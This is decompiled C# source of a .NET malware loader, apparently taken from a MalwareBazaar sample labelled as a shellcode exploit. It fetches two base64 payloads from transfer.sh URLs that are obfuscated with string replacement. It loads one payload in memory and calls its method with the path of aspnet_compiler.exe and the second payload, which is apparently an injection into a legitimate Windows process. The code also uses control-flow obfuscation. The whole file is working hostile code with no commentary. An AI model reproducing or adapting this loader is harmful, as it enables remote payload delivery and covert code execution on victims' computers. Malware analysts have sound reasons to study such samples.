// Decompiled with JetBrains decompiler
// Type: vufq6fSgVNMIp4EG6f.PUq3v5FKSwghrdEVhn
// Assembly: GDSGDYUYTTR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 93D93183-8601-46B9-AD9E-39049E6EAA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-c732fa81373242246b74a19e6f03878ce338e6cd62a102a13e60c87fc3d2a616.exe

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace vufq6fSgVNMIp4EG6f
{
  internal static class PUq3v5FKSwghrdEVhn
  {
    internal static PUq3v5FKSwghrdEVhn whxdxIspAVa8QmeA5H;

    [STAThread]
    private static void TlPO5KX1S()
    {
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create("https:###@@@###@@@transfer.sh/get/4jupB9/BASE64.txt".Replace("###@@@", "/"));
      httpWebRequest.Method = "GET";
      int num1 = 0;
      if (PUq3v5FKSwghrdEVhn.xRTVQ9eLOWisAHjbpE() != null)
        goto label_8;
label_1:
      Assembly assembly;
      StreamReader streamReader;
      string end;
      byte[] numArray;
      object args;
      string s;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_4;
          case 2:
            end = streamReader.ReadToEnd();
            num1 = 4;
            continue;
          case 3:
            assembly = Assembly.Load(PUq3v5FKSwghrdEVhn.QkT4EYVZN());
            args = (object) new object[4]
            {
              (object) "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe",
              (object) string.Empty,
              (object) numArray,
              (object) true
            };
            num1 = !PUq3v5FKSwghrdEVhn.FfabySYsIMYBpxxSxv() ? 1 : 1;
            continue;
          case 4:
            s = end;
            num1 = 5;
            continue;
          case 5:
            numArray = Convert.FromBase64String(s);
            num1 = 3;
            continue;
          default:
            streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), Encoding.UTF8);
            num1 = 2;
            continue;
        }
      }
label_4:
      assembly.GetType("KJLDKSDHSDKUI.VECTOR").InvokeMember("TRASH", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) args);
      return;
label_8:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public static byte[] QkT4EYVZN()
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      HttpWebRequest httpWebRequest;
      string requestUriString;
      while (true)
      {
        switch (num2)
        {
          case 1:
            httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
            num2 = 4;
            continue;
          case 2:
            requestUriString = "https:###@@@###@@@transfer.sh/get/WB9h7n/DDDLLLYTEHGD.txt".Replace("###@@@", "/");
            if (PUq3v5FKSwghrdEVhn.FfabySYsIMYBpxxSxv())
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          case 3:
            goto label_8;
          case 4:
            httpWebRequest.Method = "GET";
            num2 = 3;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      byte[] numArray;
      return numArray;
label_8:
      numArray = Convert.FromBase64String(new StreamReader((Stream) PUq3v5FKSwghrdEVhn.JeHd11U8anMRyIEc50((object) httpWebRequest.GetResponse()), (Encoding) PUq3v5FKSwghrdEVhn.Yq4wnAMG1JJeFRBbly()).ReadToEnd());
      goto label_5;
    }

    internal static bool FfabySYsIMYBpxxSxv() => PUq3v5FKSwghrdEVhn.whxdxIspAVa8QmeA5H == null;

    internal static PUq3v5FKSwghrdEVhn xRTVQ9eLOWisAHjbpE() => PUq3v5FKSwghrdEVhn.whxdxIspAVa8QmeA5H;

    internal static object JeHd11U8anMRyIEc50([In] object obj0) => (object) ((WebResponse) obj0).GetResponseStream();

    internal static object Yq4wnAMG1JJeFRBbly() => (object) Encoding.UTF8;
  }
}
